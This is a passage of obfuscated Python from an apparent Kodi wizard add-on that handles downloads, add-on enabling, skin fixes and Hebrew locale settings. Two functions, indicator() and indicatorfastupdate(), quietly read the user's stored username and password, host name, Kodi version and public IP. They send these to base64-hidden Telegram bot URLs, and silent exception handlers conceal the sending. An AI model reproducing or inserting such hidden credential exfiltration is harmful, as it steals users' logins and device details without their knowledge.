        OOO0O0000OOOOOOO0 =OOOO0OOO0O0O0O0OO /(1024 *1024 )#line:3484
        OOOOOO0OOO0OOO0O0 =OOOOO0OOOOOOOOOOO /(1024 *1024 )#line:3485
        OOOOOOOOO0O0OO000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0O0000OOOOOOO0 ,'teal',OOOOOO0OOO0OOO0O0 )#line:3486
        if (time .time ()-O0O0O0O0O0O0O0OOO )>0 :#line:3487
          OOO0OOO0OOOOOOO0O =OOOO0OOO0O0O0O0OO /(time .time ()-O0O0O0O0O0O0O0OOO )#line:3488
          OOO0OOO0OOOOOOO0O =OOO0OOO0OOOOOOO0O /1024 #line:3489
        else :#line:3490
         OOO0OOO0OOOOOOO0O =0 #line:3491
        O0O0O00O000OO0O0O ='KB'#line:3492
        if OOO0OOO0OOOOOOO0O >=1024 :#line:3493
           OOO0OOO0OOOOOOO0O =OOO0OOO0OOOOOOO0O /1024 #line:3494
           O0O0O00O000OO0O0O ='MB'#line:3495
        if OOO0OOO0OOOOOOO0O >0 and not OO0O0OOO00O00OOOO ==100 :#line:3496
            O0O0OO0OOOOO0OO00 =(OOOOO0OOOOOOOOOOO -OOOO0OOO0O0O0O0OO )/OOO0OOO0OOOOOOO0O #line:3497
        else :#line:3498
            O0O0OO0OOOOO0OO00 =0 #line:3499
        OO0000OO000O000O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0OOO0OOOOOOO0O ,O0O0O00O000OO0O0O )#line:3500
        OOO0O000OOO0O0OOO .update (int (OO0O0OOO00O00OOOO ),"Downloading "+name ,OOOOOOOOO0O0OO000 ,OO0000OO000O000O0 )#line:3502
  OOOO000OO000O0000 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3505
  O0O0OO00O00000000 .close ()#line:3507
  extract (OO0OOOOO0OOOOO00O ,OOOO000OO000O0000 ,OOO0O000OOO0O0OOO )#line:3509
  if os .path .exists (OOOO000OO000O0000 +'/scakemyer-script.quasar.burst'):#line:3510
    if os .path .exists (OOOO000OO000O0000 +'/script.quasar.burst'):#line:3511
     shutil .rmtree (OOOO000OO000O0000 +'/script.quasar.burst',ignore_errors =False )#line:3512
    os .rename (OOOO000OO000O0000 +'/scakemyer-script.quasar.burst',OOOO000OO000O0000 +'/script.quasar.burst')#line:3513
  if os .path .exists (OOOO000OO000O0000 +'/plugin.video.kmediatorrent-master'):#line:3515
    if os .path .exists (OOOO000OO000O0000 +'/plugin.video.kmediatorrent'):#line:3516
     shutil .rmtree (OOOO000OO000O0000 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3517
    os .rename (OOOO000OO000O0000 +'/plugin.video.kmediatorrent-master',OOOO000OO000O0000 +'/plugin.video.kmediatorrent')#line:3518
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3519
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3520
  try :#line:3521
    os .remove (OO0OOOOO0OOOOO00O )#line:3522
  except :#line:3523
    pass #line:3524
  OOO0O000OOO0O0OOO .close ()#line:3525
def dis_or_enable_addon (O000OO00OOOO0OO0O ,OOOOOO000000O0O0O ,enable ="true"):#line:3526
    import json #line:3527
    OO0OOO000O0OOO00O ='"%s"'%O000OO00OOOO0OO0O #line:3528
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O000OO00OOOO0OO0O )and enable =="true":#line:3529
        logging .warning ('already Enabled')#line:3530
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O000OO00OOOO0OO0O )#line:3531
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O000OO00OOOO0OO0O )and enable =="false":#line:3532
        return xbmc .log ("### Skipped %s, reason = not installed"%O000OO00OOOO0OO0O )#line:3533
    else :#line:3534
        O000O00O0O0000OO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO0OOO000O0OOO00O ,enable )#line:3535
        O00000000O0OOOOOO =xbmc .executeJSONRPC (O000O00O0O0000OO0 )#line:3536
        OO0O0O0O0OOO00O0O =json .loads (O00000000O0OOOOOO )#line:3537
        if enable =="true":#line:3538
            xbmc .log ("### Enabled %s, response = %s"%(O000OO00OOOO0OO0O ,OO0O0O0O0OOO00O0O ))#line:3539
        else :#line:3540
            xbmc .log ("### Disabled %s, response = %s"%(O000OO00OOOO0OO0O ,OO0O0O0O0OOO00O0O ))#line:3541
    if OOOOOO000000O0O0O =='auto':#line:3542
     return True #line:3543
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3544
def chunk_report (O00O00OO0O000OOO0 ,O0O00OO00000OO00O ,O00O000000OOOO00O ):#line:3545
   O000O0OO0OOO0O0OO =float (O00O00OO0O000OOO0 )/O00O000000OOOO00O #line:3546
   O000O0OO0OOO0O0OO =round (O000O0OO0OOO0O0OO *100 ,2 )#line:3547
   if O00O00OO0O000OOO0 >=O00O000000OOOO00O :#line:3549
      sys .stdout .write ('\n')#line:3550
def chunk_read (OO0OO0O00OO000O0O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3552
   import time #line:3553
   OOO00O0OO00000O0O =int (filesize )*1000000 #line:3554
   OO0O000O0O0000OO0 =0 #line:3556
   O0O0000O000OO00O0 =time .time ()#line:3557
   OOOOO0OOO000OO000 =0 #line:3558
   logging .warning ('Downloading')#line:3560
   with open (destination ,"wb")as O0O00O00OO000O0O0 :#line:3561
    while 1 :#line:3562
      OO0O0OO00O0000OO0 =time .time ()-O0O0000O000OO00O0 #line:3563
      O000O0O00000OOO0O =int (OOOOO0OOO000OO000 *chunk_size )#line:3564
      O000O00O0O0OOO0OO =OO0OO0O00OO000O0O .read (chunk_size )#line:3565
      O0O00O00OO000O0O0 .write (O000O00O0O0OOO0OO )#line:3566
      O0O00O00OO000O0O0 .flush ()#line:3567
      OO0O000O0O0000OO0 +=len (O000O00O0O0OOO0OO )#line:3568
      O0OOO0OO000OOO00O =float (OO0O000O0O0000OO0 )/OOO00O0OO00000O0O #line:3569
      O0OOO0OO000OOO00O =round (O0OOO0OO000OOO00O *100 ,2 )#line:3570
      if int (OO0O0OO00O0000OO0 )>0 :#line:3571
        O0O0OO0OO00OO0000 =int (O000O0O00000OOO0O /(1024 *OO0O0OO00O0000OO0 ))#line:3572
      else :#line:3573
         O0O0OO0OO00OO0000 =0 #line:3574
      if O0O0OO0OO00OO0000 >1024 and not O0OOO0OO000OOO00O ==100 :#line:3575
          O00OOO0OOOO00O000 =int (((OOO00O0OO00000O0O -O000O0O00000OOO0O )/1024 )/(O0O0OO0OO00OO0000 ))#line:3576
      else :#line:3577
          O00OOO0OOOO00O000 =0 #line:3578
      if O00OOO0OOOO00O000 <0 :#line:3579
        O00OOO0OOOO00O000 =0 #line:3580
      dp .update (int (O0OOO0OO000OOO00O ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OOO0OO000OOO00O ,O000O0O00000OOO0O /(1024 *1024 ),OOO00O0OO00000O0O /(1000 *1000 ),O0O0OO0OO00OO0000 ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O00OOO0OOOO00O000 ,60 ))#line:3581
      if dp .iscanceled ():#line:3582
         dp .close ()#line:3583
         break #line:3584
      if not O000O00O0O0OOO0OO :#line:3585
         break #line:3586
      if report_hook :#line:3588
         report_hook (OO0O000O0O0000OO0 ,chunk_size ,OOO00O0OO00000O0O )#line:3589
      OOOOO0OOO000OO000 +=1 #line:3590
   logging .warning ('END Downloading')#line:3591
   return OO0O000O0O0000OO0 #line:3592
def googledrive_download (OO0O00000O000O0O0 ,OOOOO0OO0O0000OO0 ,OO0OOO0O0OO00OOOO ,O0O0O0O0OOOOO0OO0 ):#line:3594
    OO0000O0000OO00OO =[]#line:3598
    OO000OO00O00OOOOO =OO0O00000O000O0O0 .split ('=')#line:3599
    OO0O00000O000O0O0 =OO000OO00O00OOOOO [len (OO000OO00O00OOOOO )-1 ]#line:3600
    def O0O000OO0OOOOOOOO (OO0OO0000OOOOO0OO ):#line:3602
        for OOO000OO0000000OO in OO0OO0000OOOOO0OO :#line:3604
            logging .warning ('cookie.name')#line:3605
            logging .warning (OOO000OO0000000OO .name )#line:3606
            OO0OO00O000OOOOO0 =OOO000OO0000000OO .value #line:3607
            if 'download_warning'in OOO000OO0000000OO .name :#line:3608
                logging .warning (OOO000OO0000000OO .value )#line:3609
                logging .warning ('cookie.value')#line:3610
                return OOO000OO0000000OO .value #line:3611
            return OO0OO00O000OOOOO0 #line:3612
        return None #line:3614
    def OO0O00O0OOOO000OO (OOOOOO0O00O00OO0O ,OOOO000000O0O000O ):#line:3616
        O0OOO0000O0O0OOO0 =32768 #line:3618
        O0O0O0O000000OO0O =time .time ()#line:3619
        with open (OOOO000000O0O000O ,"wb")as OO0OOO0OO0000OO0O :#line:3621
            O0OO000OOO00O0OOO =1 #line:3622
            OO0OOOOOOOO00OOO0 =32768 #line:3623
            try :#line:3624
                OO0O0OOOO0OO0000O =int (OOOOOO0O00O00OO0O .headers .get ('content-length'))#line:3625
                print ('file total size :',OO0O0OOOO0OO0000O )#line:3626
            except TypeError :#line:3627
                print ('using dummy length !!!')#line:3628
                OO0O0OOOO0OO0000O =int (O0O0O0O0OOOOO0OO0 )*1000000 #line:3629
            for O000OO000OO00OO0O in OOOOOO0O00O00OO0O .iter_content (O0OOO0000O0O0OOO0 ):#line:3630
                if O000OO000OO00OO0O :#line:3631
                    OO0OOO0OO0000OO0O .write (O000OO000OO00OO0O )#line:3632
                    OO0OOO0OO0000OO0O .flush ()#line:3633
                    O0O0OOO00OO0OOO0O =time .time ()-O0O0O0O000000OO0O #line:3634
                    OOOOOOOO0O0000O0O =int (O0OO000OOO00O0OOO *OO0OOOOOOOO00OOO0 )#line:3635
                    if O0O0OOO00OO0OOO0O ==0 :#line:3636
                        O0O0OOO00OO0OOO0O =0.1 #line:3637
                    OOOOOOOOO0OOO0000 =int (OOOOOOOO0O0000O0O /(1024 *O0O0OOO00OO0OOO0O ))#line:3638
                    OO0O0O0O00O0OO0O0 =int (O0OO000OOO00O0OOO *OO0OOOOOOOO00OOO0 *100 /OO0O0OOOO0OO0000O )#line:3639
                    if OOOOOOOOO0OOO0000 >1024 and not OO0O0O0O00O0OO0O0 ==100 :#line:3640
                      OO00O00000O000OO0 =int (((OO0O0OOOO0OO0000O -OOOOOOOO0O0000O0O )/1024 )/(OOOOOOOOO0OOO0000 ))#line:3641
                    else :#line:3642
                      OO00O00000O000OO0 =0 #line:3643
                    OO0OOO0O0OO00OOOO .update (int (OO0O0O0O00O0OO0O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO0O0O0O00O0OO0O0 ,OOOOOOOO0O0000O0O /(1024 *1024 ),OO0O0OOOO0OO0000O /(1000 *1000 ),OOOOOOOOO0OOO0000 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO00O00000O000OO0 ,60 ))#line:3645
                    O0OO000OOO00O0OOO +=1 #line:3646
                    if OO0OOO0O0OO00OOOO .iscanceled ():#line:3647
                     OO0OOO0O0OO00OOOO .close ()#line:3648
                     break #line:3649
    OOO0O00OOO0O00000 ="https://docs.google.com/uc?export=download"#line:3650
    import urllib2 #line:3655
    import cookielib #line:3656
    from cookielib import CookieJar #line:3658
    O0OOOO0O0OO0OOO0O =CookieJar ()#line:3660
    O0O0O0OO0O0000O00 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0OOOO0O0OO0OOO0O ))#line:3661
    O0000O0OO0O0OO00O ={'id':OO0O00000O000O0O0 }#line:3663
    O00OO00O0000OO00O =urllib .urlencode (O0000O0OO0O0OO00O )#line:3664
    logging .warning (OOO0O00OOO0O00000 +'&'+O00OO00O0000OO00O )#line:3665
    OOOO00O0OOO00OOO0 =O0O0O0OO0O0000O00 .open (OOO0O00OOO0O00000 +'&'+O00OO00O0000OO00O )#line:3666
    OOO0O0O000OO000O0 =OOOO00O0OOO00OOO0 .read ()#line:3667
    for OOO000O00O0OO00O0 in O0OOOO0O0OO0OOO0O :#line:3669
         logging .warning (OOO000O00O0OO00O0 )#line:3670
    OOO0O00OOO0O0O00O =O0O000OO0OOOOOOOO (O0OOOO0O0OO0OOO0O )#line:3671
    logging .warning (OOO0O00OOO0O0O00O )#line:3672
    if OOO0O00OOO0O0O00O :#line:3673
        O0O00O000O0O00O0O ={'id':OO0O00000O000O0O0 ,'confirm':OOO0O00OOO0O0O00O }#line:3674
        OO0OOOOO0O000OOOO ={'Access-Control-Allow-Headers':'Content-Length'}#line:3675
        O00OO00O0000OO00O =urllib .urlencode (O0O00O000O0O00O0O )#line:3676
        OOOO00O0OOO00OOO0 =O0O0O0OO0O0000O00 .open (OOO0O00OOO0O00000 +'&'+O00OO00O0000OO00O )#line:3677
        chunk_read (OOOO00O0OOO00OOO0 ,report_hook =chunk_report ,dp =OO0OOO0O0OO00OOOO ,destination =OOOOO0OO0O0000OO0 ,filesize =O0O0O0O0OOOOO0OO0 )#line:3678
    return (OO0000O0000OO00OO )#line:3682
def kodi17Fix ():#line:3683
	OOO0O000OOO0OO000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3684
	O0OO0000OO0O00OO0 =[]#line:3685
	for O0O0000O0OOO000OO in sorted (OOO0O000OOO0OO000 ,key =lambda O000O000000000OOO :O000O000000000OOO ):#line:3686
		OOOOOOO0O000OOO0O =os .path .join (O0O0000O0OOO000OO ,'addon.xml')#line:3687
		if os .path .exists (OOOOOOO0O000OOO0O ):#line:3688
			O0O0O0O0OO00OOOOO =O0O0000O0OOO000OO .replace (ADDONS ,'')[1 :-1 ]#line:3689
			O0O0OO0O0O0OO0OOO =open (OOOOOOO0O000OOO0O )#line:3690
			OOOOO0OOOOO0O0OOO =O0O0OO0O0O0OO0OOO .read ()#line:3691
			O0OO000O0O0O0O000 =parseDOM (OOOOO0OOOOO0O0OOO ,'addon',ret ='id')#line:3692
			O0O0OO0O0O0OO0OOO .close ()#line:3693
			try :#line:3694
				OOO000000O00OO0O0 =xbmcaddon .Addon (id =O0OO000O0O0O0O000 [0 ])#line:3695
			except :#line:3696
				try :#line:3697
					log ("%s was disabled"%O0OO000O0O0O0O000 [0 ],xbmc .LOGDEBUG )#line:3698
					O0OO0000OO0O00OO0 .append (O0OO000O0O0O0O000 [0 ])#line:3699
				except :#line:3700
					try :#line:3701
						log ("%s was disabled"%O0O0O0O0OO00OOOOO ,xbmc .LOGDEBUG )#line:3702
						O0OO0000OO0O00OO0 .append (O0O0O0O0OO00OOOOO )#line:3703
					except :#line:3704
						if len (O0OO000O0O0O0O000 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0O0O0O0OO00OOOOO ,xbmc .LOGERROR )#line:3705
						else :log ("Unabled to enable: %s"%O0O0000O0OOO000OO ,xbmc .LOGERROR )#line:3706
	if len (O0OO0000OO0O00OO0 )>0 :#line:3707
		OO0OOO00OO000OO00 =0 #line:3708
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3709
		for O0000OO00O000OOO0 in O0OO0000OO0O00OO0 :#line:3710
			OO0OOO00OO000OO00 +=1 #line:3711
			O0O00OOO00O0O0OOO =int (percentage (OO0OOO00OO000OO00 ,len (O0OO0000OO0O00OO0 )))#line:3712
			DP .update (O0O00OOO00O0O0OOO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000OO00O000OOO0 ))#line:3713
			addonDatabase (O0000OO00O000OOO0 ,1 )#line:3714
			if DP .iscanceled ():break #line:3715
		if DP .iscanceled ():#line:3716
			DP .close ()#line:3717
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3718
			sys .exit ()#line:3719
		DP .close ()#line:3720
	forceUpdate ()#line:3721
def indicator ():#line:3723
       try :#line:3724
          import json #line:3725
          wiz .log ('FRESH MESSAGE')#line:3726
          OOO00O00O0OOO0OO0 =(ADDON .getSetting ("user"))#line:3727
          O0OO000000O000O00 =(ADDON .getSetting ("pass"))#line:3728
          O00OO000OO00O000O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3729
          O0O0OOOO000OO0O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3730
          OO00OO0O0OO000OO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3731
          OOOOO0O00O0OO0000 =str (json .loads (OO00OO0O0OO000OO0 )['ip'])#line:3732
          O0OOOO0OOO00000OO =OOO00O00O0OOO0OO0 #line:3733
          O0O0OOO00OO0O000O =O0OO000000O000O00 #line:3734
          import socket #line:3735
          OO00OO0O0OO000OO0 =urllib2 .urlopen (O0O0OOOO000OO0O00 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0OOOO0OOO00000OO +' - '+O0O0OOO00OO0O000O +' - '+O00OO000OO00O000O +' - '+OOOOO0O00O0OO0000 ).readlines ()#line:3736
       except :pass #line:3738
def indicatorfastupdate ():#line:3740
       try :#line:3741
          import json #line:3742
          wiz .log ('FRESH MESSAGE')#line:3743
          O0000OO000O00OOOO =(ADDON .getSetting ("user"))#line:3744
          O00OOOOOOO0000000 =(ADDON .getSetting ("pass"))#line:3745
          O0O0OO000O0OOOO0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3746
          OOOOO0O00O00O0O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3748
          OO0OO0OOOO000OOO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3749
          OO0OOO00OOOO00OO0 =str (json .loads (OO0OO0OOOO000OOO0 )['ip'])#line:3750
          O000O0OOOO0O0OO00 =O0000OO000O00OOOO #line:3751
          OOOOOOO0O0O0O00OO =O00OOOOOOO0000000 #line:3752
          import socket #line:3754
          OO0OO0OOOO000OOO0 =urllib2 .urlopen (OOOOO0O00O00O0O00 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O000O0OOOO0O0OO00 +' - '+OOOOOOO0O0O0O00OO +' - '+O0O0OO000O0OOOO0O +' - '+OO0OOO00OOOO00OO0 ).readlines ()#line:3755
       except :pass #line:3757
def skinfix18 ():#line:3759
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3760
		OOO000OOO0O0O00O0 =wiz .workingURL (SKINID18DDONXML )#line:3761
		if OOO000OOO0O0O00O0 ==True :#line:3762
			O0OOOO0OOOO00OO00 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3763
			if len (O0OOOO0OOOO00OO00 )>0 :#line:3764
				OO0O0000O00000O0O ='%s-%s.zip'%(SKINID18 ,O0OOOO0OOOO00OO00 [0 ])#line:3765
				O0O0OO0OO00OO0O0O =wiz .workingURL (SKIN18ZIPURL +OO0O0000O00000O0O )#line:3766
				if O0O0OO0OO00OO0O0O ==True :#line:3767
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3768
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3769
					O00O0OOO000OO0OOO =os .path .join (PACKAGES ,OO0O0000O00000O0O )#line:3770
					try :os .remove (O00O0OOO000OO0OOO )#line:3771
					except :pass #line:3772
					downloader .download (SKIN18ZIPURL +OO0O0000O00000O0O ,O00O0OOO000OO0OOO ,DP )#line:3773
					extract .all (O00O0OOO000OO0OOO ,HOME ,DP )#line:3774
					try :#line:3775
						OO0O0000OOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3776
						O00000O0O0OO0000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3777
						os .rename (OO0O0000OOO0OOOOO ,O00000O0O0OO0000O )#line:3778
					except :#line:3779
						pass #line:3780
					try :#line:3781
						O000OO0OOO0O0OOO0 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO0OOOOO0OO0OOOO0 =O000OO0OOO0O0OOO0 .read ();O000OO0OOO0O0OOO0 .close ()#line:3782
						OOOOOO00OO0O00OO0 =wiz .parseDOM (OO0OOOOO0OO0OOOO0 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3783
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOO00OO0O00OO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3784
					except :#line:3785
						pass #line:3786
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3787
					DP .close ()#line:3788
					xbmc .sleep (500 )#line:3789
					wiz .forceUpdate (True )#line:3790
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3791
				else :#line:3792
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3793
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O0OO0OO00OO0O0O ,xbmc .LOGERROR )#line:3794
			else :#line:3795
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3796
		else :#line:3797
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3798
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3799
def skinfix17 ():#line:3800
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3801
		OO0000OOOO00000O0 =wiz .workingURL (SKINID17DDONXML )#line:3802
		if OO0000OOOO00000O0 ==True :#line:3803
			O0OO000OO00OO0O00 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3804
			if len (O0OO000OO00OO0O00 )>0 :#line:3805
				O00OOOOO00OO00000 ='%s-%s.zip'%(SKINID17 ,O0OO000OO00OO0O00 [0 ])#line:3806
				O0O0O0OOOO0000O0O =wiz .workingURL (SKIN17ZIPURL +O00OOOOO00OO00000 )#line:3807
				if O0O0O0OOOO0000O0O ==True :#line:3808
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3809
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3810
					OOO000OO0O0O00000 =os .path .join (PACKAGES ,O00OOOOO00OO00000 )#line:3811
					try :os .remove (OOO000OO0O0O00000 )#line:3812
					except :pass #line:3813
					downloader .download (SKIN17ZIPURL +O00OOOOO00OO00000 ,OOO000OO0O0O00000 ,DP )#line:3814
					extract .all (OOO000OO0O0O00000 ,HOME ,DP )#line:3815
					try :#line:3816
						O0O0OO0OO00000O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3817
						OOO0OO0OO0O0O00OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3818
						os .rename (O0O0OO0OO00000O00 ,OOO0OO0OO0O0O00OO )#line:3819
					except :#line:3820
						pass #line:3821
					try :#line:3822
						OO0000OO0O0000O00 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0O0000O000000OOO =OO0000OO0O0000O00 .read ();OO0000OO0O0000O00 .close ()#line:3823
						OOOO00O00000000OO =wiz .parseDOM (O0O0000O000000OOO ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3824
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO00O00000000OO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3825
					except :#line:3826
						pass #line:3827
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3828
					DP .close ()#line:3829
					xbmc .sleep (500 )#line:3830
					wiz .forceUpdate (True )#line:3831
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3832
				else :#line:3833
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3834
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O0O0OOOO0000O0O ,xbmc .LOGERROR )#line:3835
			else :#line:3836
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3837
		else :#line:3838
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3839
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3840
def fix17update ():#line:3841
	if KODIV >=17 and KODIV <18 :#line:3842
		wiz .kodi17Fix ()#line:3843
		xbmc .sleep (4000 )#line:3844
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3845
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3846
		fixfont ()#line:3847
		O0O0O0O00O0OO0OOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3848
		try :#line:3850
			OOO0OO0O0OOO0OO0O =open (O0O0O0O00O0OO0OOO ,'r')#line:3851
			O0OOO0O0O00O0OOO0 =OOO0OO0O0OOO0OO0O .read ()#line:3852
			OOO0OO0O0OOO0OO0O .close ()#line:3853
			O0O000OO00OO00OOO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3854
			OOOOO00OO00000000 =re .compile (O0O000OO00OO00OOO ).findall (O0OOO0O0O00O0OOO0 )[0 ]#line:3855
			OOO0OO0O0OOO0OO0O =open (O0O0O0O00O0OO0OOO ,'w')#line:3856
			OOO0OO0O0OOO0OO0O .write (O0OOO0O0O00O0OOO0 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOOOO00OO00000000 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3857
			OOO0OO0O0OOO0OO0O .close ()#line:3858
		except :#line:3859
				pass #line:3860
		wiz .kodi17Fix ()#line:3861
		O0O0O0O00O0OO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3862
		try :#line:3863
			OOO0OO0O0OOO0OO0O =open (O0O0O0O00O0OO0OOO ,'r')#line:3864
			O0OOO0O0O00O0OOO0 =OOO0OO0O0OOO0OO0O .read ()#line:3865
			OOO0OO0O0OOO0OO0O .close ()#line:3866
			O0O000OO00OO00OOO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3867
			OOOOO00OO00000000 =re .compile (O0O000OO00OO00OOO ).findall (O0OOO0O0O00O0OOO0 )[0 ]#line:3868
			OOO0OO0O0OOO0OO0O =open (O0O0O0O00O0OO0OOO ,'w')#line:3869
			OOO0OO0O0OOO0OO0O .write (O0OOO0O0O00O0OOO0 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOOOO00OO00000000 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3870
			OOO0OO0O0OOO0OO0O .close ()#line:3871
		except :#line:3872
				pass #line:3873
		swapSkins ('skin.Premium.mod')#line:3874
def fix18update ():#line:3876
	if KODIV >=18 :#line:3877
		xbmc .sleep (4000 )#line:3878
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3879
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3880
		fixfont ()#line:3881
		OOOO00O00OOO0OOO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3882
		try :#line:3883
			OO00O00O000OOO0O0 =open (OOOO00O00OOO0OOO0 ,'r')#line:3884
			O000OOOOO00OO0O00 =OO00O00O000OOO0O0 .read ()#line:3885
			OO00O00O000OOO0O0 .close ()#line:3886
			OO00000OOO0OOO00O ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3887
			O0OO0OO0OO0OOO000 =re .compile (OO00000OOO0OOO00O ).findall (O000OOOOO00OO0O00 )[0 ]#line:3888
